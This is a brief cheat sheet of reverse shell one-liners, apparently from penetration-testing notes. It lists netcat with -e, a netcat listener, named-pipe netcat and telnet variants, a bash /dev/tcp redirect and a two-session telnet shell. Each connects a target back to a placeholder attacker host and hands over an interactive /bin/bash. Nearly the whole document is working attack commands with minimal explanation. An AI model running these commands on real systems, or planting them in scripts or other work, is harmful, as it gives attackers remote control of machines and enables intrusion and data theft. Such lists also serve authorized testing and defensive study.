## Netcat

Target machine connect back to the attack machine

```
nc [ip addr] [port] -e [shell]
```

Attack machine listener

```
nc -n -vv -l -p [port]
```

## netcat with GAPING_SECURITY_HOLE disabled

Target machine connect back to the attack machine with `GAPING_SECURITY_HOLE` disabled

```
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

##  netcat without netcat

It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system.

### Target Machine
```
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
```

## netcat without netcat or /dev/tcp

### Target Machine
```
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

## telnet-to-telnet
This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other.

```
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
```
